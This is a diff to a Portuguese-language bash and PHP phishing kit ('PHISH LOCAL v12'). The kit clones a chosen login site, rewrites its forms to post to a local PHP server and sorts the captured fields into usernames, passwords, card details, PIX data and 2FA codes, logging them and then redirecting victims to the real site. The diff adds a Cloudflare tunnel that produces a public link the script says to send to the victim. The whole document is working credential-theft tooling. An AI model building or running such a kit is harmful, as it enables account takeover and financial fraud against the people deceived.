@@ -1,8 +1,8 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v11 - PHP Server (SEM Cloudflare)
-# Captura QUALQUER campo de QUALQUER site
-# Funciona só na mesma rede Wi-Fi
+# 🎣 PHISH LOCAL v12 - PHP + Custom URL
+# Captura QUALQUER campo | Redirect custom
+// | Clone certinho | Cloudflare opcional
 # ============================================
 
 SITE_DIR="site_clone"
@@ -12,7 +12,7 @@ PORT=8080
 clear
 echo ""
 echo "=========================================="
-echo "  🎣 PHISH LOCAL v11"
+echo "  🎣 PHISH LOCAL v12"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
@@ -37,17 +37,65 @@ case "$CHOICE" in
     echo ""
     echo "[!] Alvo: $URL"
 
+    echo ""
+    echo -n "URL local (ex: instagram.com, g1.com.br): "
+    read CUSTOM_URL
+    CUSTOM_URL=$(echo "$CUSTOM_URL" | tr -d '\r\n' | xargs | sed 's|https?://||;s|/.*||;s|[^a-zA-Z0-9.-]|-|g')
+    [ -z "$CUSTOM_URL" ] && CUSTOM_URL="login"
+    echo "[!] URL local: https://${CUSTOM_URL}"
+
+    echo ""
+    echo -n "Redirecionar para (ex: https://instagram.com): "
+    read REDIRECT_URL
+    REDIRECT_URL=$(echo "$REDIRECT_URL" | tr -d '\r\n' | xargs)
+    [ -z "$REDIRECT_URL" ] && REDIRECT_URL="https://instagram.com"
+    if ! echo "$REDIRECT_URL" | grep -qE '^https?://'; then
+        REDIRECT_URL="https://$REDIRECT_URL"
+    fi
+    echo "[!] Redirect: $REDIRECT_URL"
+
     # --- CLONAR SITE ---
+    echo ""
     echo "[...] Clonando site..."
     rm -rf "$SITE_DIR"
     mkdir -p "$SITE_DIR"
 
     USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+
+    # Baixar HTML
     curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null
 
-    if [ ! -s "$SITE_DIR/index.html" ]; then
-        echo "[!] Nao foi possivel clon. Usando fallback."
-        cat > "$SITE_DIR/index.html" << 'EOF'
+    # Baixar recursos (imagens, css, js)
+    grep -oE 'url\([^)]+\)' "$SITE_DIR/index.html" 2>/dev/null | head -50 > /tmp/resources.txt
+    grep -oE '(href|src)=["'"'"'][^"'"'"' ]*\.(css|png|jpg|jpeg|gif|svg|ico|webp|woff2?|ttf|mp4|webm)["'"'"']' "$SITE_DIR/index.html" | sed -E 's/.*=["'"'"']//; s/["'"'"']$//' >> /tmp/resources.txt
+
+    sort -u /tmp/resources.txt | while read -r res; do
+        # Remove quotes
+        res=$(echo "$res" | tr -d "'\"" | sed 's/^url(//;s/)$//')
+        # Skip data URIs e #
+        echo "$res" | grep -qE '^(data:|#|javascript:)' && continue
+
+        # Montar URL completa
+        if echo "$res" | grep -qE '^//'; then
+            res="https:$res"
+        elif echo "$res" | grep -qvE '^https?://'; then
+            if echo "$res" | grep -qE '^/'; then
+                res="${URL%/}$res"
+            else
+                res="${URL%/}/$res"
+            fi
+        fi
+
+        fname=$(basename "$res" | sed 's/[^a-zA-Z0-9._-]/_/g' | sed 's/__*/_/g')
+        [[ "$fname" =~ ^index\.html ]] && continue
+
+        curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/$fname" "$res" 2>/dev/null
+    done
+
+    # Verificar se o site foi clonado corretamente
+    if [ ! -s "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
+        echo "[!] Nao foi possivel clonar corretamente. Usando fallback."
+        cat > "$SITE_DIR/index.html" << EOF
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -60,67 +108,113 @@ case "$CHOICE" in
 EOF
     fi
 
-    # Aforms pra POST
+    # Ajustar forms
     sed -i 's/<form/<form method="POST">/gi' "$SITE_DIR/index.html" 2>/dev/null
+    sed -i 's/action="[^"]*"/action=""/gi' "$SITE_DIR/index.html" 2>/dev/null
 
-    echo "[OK] Site clonado!"
+    echo "[OK] Site clonado! Recursos: $(ls "$SITE_DIR" | wc -l) arquivos"
 
     # --- PEGAR IP ---
     IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
     [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
     [ -z "$IP" ] && IP="127.0.0.1"
 
-    # --- CRIAR SERVIDOR PHP ---
-    cat > server.php << 'PHPEOF'
-<?php
-$WORDLIST = ["login","signin","sign_in","log_in","entrar","acessar","iniciar","cadastrar","registrar","username","user","email","e-mail","telefone","phone","cpf","cnpj","matricula","identifier","userid","password","senha","pass","passwd","pwd","palavra","chave","secret","pin","codigo","nome","name","fullname","firstname","lastname","sobrenome","social_name","razao_social","mae","pai","data","date","nascimento","birth","birthdate","ano","mes","dia","endereco","rua","avenida","address","street","cep","zip","zipcode","bairro","cidade","pais","country","complemento","empresa","company","trabalho","profissao","escola","universidade","curso","departamento","cargo","cartao","card","credit_card","cvv","validade","conta","banco","agencia","pix","token","otp","verification","captcha","2fa","auth","pergunta","resposta","termos","terms","privacidade","privacy","aceitar","remember","newsletter"];
-$REDIRECT = "https://instagram.com";
-$LOG_FILE = "capturas.txt";
-$SITE_DIR = "site_clone";
+    # --- CLOUDFLARE TUNNEL (OPCIONAL) ---
+    CF_INSTALLED=false
+    if command -v cloudflared &>/dev/null; then
+        CF_INSTALLED=true
+    fi
 
-function classifyField($name) {
-    $name = strtolower(preg_replace('/[^a-z0-9_]/', '', $name));
-    foreach ($WORDLIST as $w) {
-        if (strpos($name, $w) !== false || strpos($w, $name) !== false) {
-            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', $w)) return 'USUARIO';
-            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', $w)) return 'SENHA';
-            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', $w)) return 'NOME';
-            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', $w)) return 'DATA';
-            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', $w)) return 'ENDERECO';
-            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', $w)) return 'ESCOLA_TRABALHO';
-            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', $w)) return 'PAGAMENTO';
-            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', $w)) return 'SEGURANCA';
-            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', $w)) return 'PREFERENCIA';
+    echo ""
+    echo "=========================================="
+    echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
+    echo "=========================================="
+    echo ""
+
+    if [ "$CF_INSTALLED" = true ]; then
+        echo "[OK] Cloudflared ja instalado!"
+        echo ""
+        echo "  1) Usar Cloudflare Tunnel (link publico)"
+        echo "  2) Usar so o IP local ($IP:$PORT)"
+        echo ""
+        echo -n "Escolha: "
+        read CF_CHOICE
+    else
+        echo "Cloudflared nao instalado."
+        echo ""
+        echo "  1) Usar so o IP local ($IP:$PORT)"
+        echo "  2) Instalar cloudflared e usar Tunnel"
+        echo ""
+        echo -n "Escolha: "
+        read CF_CHOICE
+
+        if [ "$CF_CHOICE" = "2" ]; then
+            echo "[...] Instalando cloudflared..."
+            pkg install cloudflared -y 2>/dev/null
+            if command -v cloudflared &>/dev/null; then
+                CF_INSTALLED=true
+                CF_CHOICE=1
+                echo "[OK] Instalado!"
+            else
+                echo "[ERRO] Falha. Usando IP local."
+                CF_CHOICE=1
+            fi
+        else
+            CF_CHOICE=2
+        fi
+    fi
+
+    # --- CRIAR SERVIDOR PHP ---
+    cat > server.php << PHPEOF
+<?php
+\$WORDLIST = ["login","signin","sign_in","log_in","entrar","acessar","iniciar","cadastrar","registrar","username","user","email","e-mail","telefone","phone","cpf","cnpj","matricula","identifier","userid","password","senha","pass","passwd","pwd","palavra","chave","secret","pin","codigo","nome","name","fullname","firstname","lastname","sobrenome","social_name","razao_social","mae","pai","data","date","nascimento","birth","birthdate","ano","mes","dia","endereco","rua","avenida","address","street","cep","zip","zipcode","bairro","cidade","pais","country","complemento","empresa","company","trabalho","profissao","escola","universidade","curso","departamento","cargo","cartao","card","credit_card","cvv","validade","conta","banco","agencia","pix","token","otp","verification","captcha","2fa","auth","pergunta","resposta","termos","terms","privacidade","privacy","aceitar","remember","newsletter"];
+\$REDIRECT = "$REDIRECT_URL";
+\$LOG_FILE = "capturas.txt";
+\$SITE_DIR = "site_clone";
+
+function classifyField(\$name) {
+    \$name = strtolower(preg_replace('/[^a-z0-9_]/', '', \$name));
+    foreach (\$WORDLIST as \$w) {
+        if (strpos(\$name, \$w) !== false || strpos(\$w, \$name) !== false) {
+            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', \$w)) return 'USUARIO';
+            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', \$w)) return 'SENHA';
+            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', \$w)) return 'NOME';
+            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', \$w)) return 'DATA';
+            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', \$w)) return 'ENDERECO';
+            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', \$w)) return 'ESCOLA_TRABALHO';
+            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', \$w)) return 'PAGAMENTO';
+            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', \$w)) return 'SEGURANCA';
+            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', \$w)) return 'PREFERENCIA';
             return 'EXTRA';
         }
     }
     return 'OUTRO';
 }
 
-$_SERVER['REQUEST_URI'] = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-$uri = $_SERVER['REQUEST_URI'];
+\$_SERVER['REQUEST_URI'] = parse_url(\$_SERVER['REQUEST_URI'], PHP_URL_PATH);
+\$uri = \$_SERVER['REQUEST_URI'];
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-    $timestamp = date('Y-m-d H:i:s');
-    $classified = array('USUARIO'=>array(),'SENHA'=>array(),'NOME'=>array(),'DATA'=>array(),'ENDERECO'=>array(),'ESCOLA_TRABALHO'=>array(),'PAGAMENTO'=>array(),'SEGURANCA'=>array(),'PREFERENCIA'=>array(),'EXTRA'=>array(),'OUTRO'=>array());
-    foreach ($_POST as $k => $v) {
-        $cat = classifyField($k);
-        $classified[$cat][] = "$k: $v";
+if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
+    \$ip = \$_SERVER['HTTP_X_FORWARDED_FOR'] ?? \$_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    \$timestamp = date('Y-m-d H:i:s');
+    \$classified = array('USUARIO'=>array(),'SENHA'=>array(),'NOME'=>array(),'DATA'=>array(),'ENDERECO'=>array(),'ESCOLA_TRABALHO'=>array(),'PAGAMENTO'=>array(),'SEGURANCA'=>array(),'PREFERENCIA'=>array(),'EXTRA'=>array(),'OUTRO'=>array());
+    foreach (\$_POST as \$k => \$v) {
+        \$cat = classifyField(\$k);
+        \$classified[\$cat][] = "\$k: \$v";
     }
-    $log = json_encode(array('timestamp'=>$timestamp,'ip'=>$ip,'fields'=>$_POST,'classified'=>$classified))."\n";
-    file_put_contents($LOG_FILE, $log, FILE_APPEND);
-    header("Location: $REDIRECT");
+    \$log = json_encode(array('timestamp'=>\$timestamp,'ip'=>\$ip,'fields'=>\$_POST,'classified'=>\$classified))."\n";
+    file_put_contents(\$LOG_FILE, \$log, FILE_APPEND);
+    header("Location: \$REDIRECT");
     exit;
 }
 
-if ($uri === '/' || $uri === '') $uri = '/index.html';
-$path = realpath($SITE_DIR . $uri);
-if ($path && strpos($path, realpath($SITE_DIR)) === 0 && is_file($path)) {
-    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-    $mime = array('html'=>'text/html','css'=>'text/css','js'=>'application/javascript','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','webp'=>'image/webp','woff'=>'font/woff','woff2'=>'font/woff2');
-    header('Content-Type: '.($mime[$ext]??'application/octet-stream'));
-    readfile($path);
+if (\$uri === '/' || \$uri === '') \$uri = '/index.html';
+\$path = realpath(\$SITE_DIR . \$uri);
+if (\$path && strpos(\$path, realpath(\$SITE_DIR)) === 0 && is_file(\$path)) {
+    \$ext = strtolower(pathinfo(\$path, PATHINFO_EXTENSION));
+    \$mime = array('html'=>'text/html','css'=>'text/css','js'=>'application/javascript','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','webp'=>'image/webp','woff'=>'font/woff','woff2'=>'font/woff2');
+    header('Content-Type: '.(\$mime[\$ext]??'application/octet-stream'));
+    readfile(\$path);
     exit;
 }
 
@@ -140,23 +234,74 @@ PHPEOF
     SERVER_PID=$!
     sleep 2
 
+    # --- CLOUDFLARE TUNNEL ---
+    CF_URL=""
+    if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ] && command -v cloudflared &>/dev/null; then
+        echo ""
+        echo "[...] Criando tunnel... aguarde..."
+        echo ""
+
+        if [ "$IP" != "127.0.0.1" ] && [ -n "$IP" ]; then
+            CF_TARGET="http://${IP}:$PORT"
+        else
+            CF_TARGET="http://localhost:$PORT"
+        fi
+
+        cloudflared tunnel --url "$CF_TARGET" > /tmp/cf_tunnel.log 2>&1 &
+        CF_PID=$!
+
+        for i in $(seq 1 20); do
+            sleep 1
+            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
+            if [ -n "$CF_URL" ]; then
+                break
+            fi
+        done
+
+        if [ -n "$CF_URL" ]; then
+            echo "[OK] Tunnel criado!"
+        else
+            echo "[AVISO] Tunnel nao gerou URL em 20s."
+            head -5 /tmp/cf_tunnel.log
+        fi
+    fi
+
+    # --- MOSTRAR RESULTADO ---
     clear
     echo ""
     echo "=========================================="
     echo "         SERVIDOR PRONTO!"
     echo "=========================================="
     echo ""
-    echo "  Acesse de qualquer dispositivo"
-    echo "  na mesma rede Wi-Fi:"
-    echo ""
-    echo "  🔥 http://${IP}:${PORT}"
+    if [ -n "$CF_URL" ]; then
+        echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
+        echo ""
+        echo "    ${CF_URL}"
+        echo ""
+        echo "  Funciona de QUALQUER lugar do mundo!"
+    else
+        echo "  Acesse de qualquer dispositivo"
+        echo "  na mesma rede Wi-Fi:"
+        echo ""
+        echo "  🔥 http://${CUSTOM_URL}:${PORT}"
+        echo "    (ou http://${IP}:${PORT})"
+    fi
     echo ""
     echo "  Parar: Ctrl+C"
     echo ""
-    echo "Aguardando capturas..."
+    echo "  📝 Capturas sendo exibidas abaixo..."
+    echo ""
+    echo "=========================================="
     echo ""
 
+    # --- MOSTRAR CAPTURAS EM TEMPO REAL ---
+    tail -f "$LOG_FILE" 2>/dev/null &
+    TAIL_PID=$!
+
+    # Aguarda Ctrl+C
+    trap "kill $SERVER_PID $TAIL_PID 2>/dev/null; echo ''; echo '[OK] Servidor parado!'; exit 0" INT TERM
     wait $SERVER_PID
+    kill $TAIL_PID 2>/dev/null
     ;;
 
 2)
